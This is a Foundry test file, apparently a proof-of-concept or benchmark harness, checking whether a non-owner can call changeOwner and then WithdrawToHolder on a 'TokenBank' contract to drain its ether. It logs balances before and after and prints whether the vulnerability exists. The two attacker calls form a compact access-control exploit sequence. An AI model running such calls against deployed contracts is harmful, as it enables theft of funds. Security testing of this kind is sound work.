// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract TokenBankTest is Test {
    TokenBank public bank;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Fund deployer with 1 ether
        vm.deal(deployer, 1 ether);
        
        vm.startPrank(deployer);
        bank = new TokenBank();
        // Send 1 ether to the TokenBank contract
        (bool sent,) = address(bank).call{value: 1 ether}("");
        require(sent, "Funding failed");
        vm.stopPrank();
    }

    function test_changeOwnerDoesNotRevertWhenNotOwner() public {
        // Verify initial bank balance
        assertEq(address(bank).balance, 1 ether, "Initial bank balance should be 1 ether");
        
        // Attacker should start with 0 ether
        assertEq(attacker.balance, 0, "Attacker initial balance should be 0");

        // Record pre-attack state
        uint256 preBankBalance = address(bank).balance;
        uint256 preAttackerBalance = attacker.balance;
        emit log("--- BEFORE-Trigger State ---");
        emit log_named_uint("TokenBank balance (ETH):", preBankBalance);
        emit log_named_uint("Attacker balance (ETH):", preAttackerBalance);
        
        // Attack triggers
        emit log("--- Trigger: Attacker calls changeOwner & WithdrawToHolder ---");
        vm.prank(attacker);
        bank.changeOwner(attacker); // Non-reverting call by non-owner
        
        vm.prank(attacker);
        bank.WithdrawToHolder(attacker, 1 ether); // Should fail

        // Record post-attack state
        uint256 postBankBalance = address(bank).balance;
        uint256 postAttackerBalance = attacker.balance;
        emit log("--- AFTER-Trigger State ---");
        emit log_named_uint("TokenBank balance (ETH):", postBankBalance);
        emit log_named_uint("Attacker balance (ETH):", postAttackerBalance);

        // Vulnerability verdict - checks if balances changed
        bool stateChanged = (postBankBalance != preBankBalance) || 
                            (postAttackerBalance != preAttackerBalance);
                            
        if (stateChanged) {
            emit log("Vulnerability Exists: Attacker successfully modified token bank state");
        } else {
            emit log("Vulnerability not Exist: Attack failed to modify token balances");
        }

        // Final assertions
        assertEq(address(bank).balance, 1 ether, "Bank balance should remain 1 ether");
        assertEq(attacker.balance, 0, "Attacker shouldn't receive any ether");
    }
}